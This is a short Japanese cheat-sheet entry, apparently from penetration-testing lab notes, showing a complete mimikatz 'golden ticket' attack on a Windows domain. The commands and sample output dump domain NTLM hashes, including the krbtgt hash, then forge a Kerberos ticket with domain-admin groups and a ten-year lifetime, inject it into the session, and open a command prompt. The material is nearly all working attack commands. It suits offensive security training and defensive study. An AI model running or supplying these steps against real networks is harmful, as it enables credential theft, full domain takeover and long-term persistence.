### ゴールデンチケット
```sh
# ドメイン管理者の権限、またはドメインコントローラの侵害が必要

mimikatz # privilege::debug
# Privilege '20' OK

# krbtgtのハッシュを取得
mimikatz # lsadump::lsa /patch
# Domain : CORP / S-1-5-21-1987370270-658905905-1781884369
# 
# RID  : 000001f4 (500)
# User : Administrator
# LM   :
# NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e
# 
# RID  : 000001f5 (501)
# User : Guest
# LM   :
# NTLM :
# 
# RID  : 000001f6 (502)
# User : krbtgt
# LM   :
# NTLM : 1693c6cefafffc7af11ef34d1c788f47

# 既存のKerberosチケットを削除
mimikatz # kerberos::purge
# Ticket(s) purge for current session is OK

# /userには既存のドメインユーザを指定
# /sidはwhoami /userから取得
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
# User      : jen
# Domain    : corp.com (CORP)
# SID       : S-1-5-21-1987370270-658905905-1781884369
# User Id   : 500    
# Groups Id : *513 512 520 518 519
# ServiceKey: 1693c6cefafffc7af11ef34d1c788f47 - rc4_hmac_nt
# Lifetime  : 9/16/2022 2:15:57 AM ; 9/13/2032 2:15:57 AM ; 9/13/2032 2:15:57 AM
# -> Ticket : ** Pass The Ticket **
# 
# * PAC generated
#  * PAC signed
#  * EncTicketPart generated
#  * EncTicketPart encrypted
#  * KrbCred generated
# 
# Golden ticket for 'jen @ corp.com' successfully submitted for current session

# コマンドプロンプトを起動
mimikatz # misc::cmd
# Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF665F1B800


```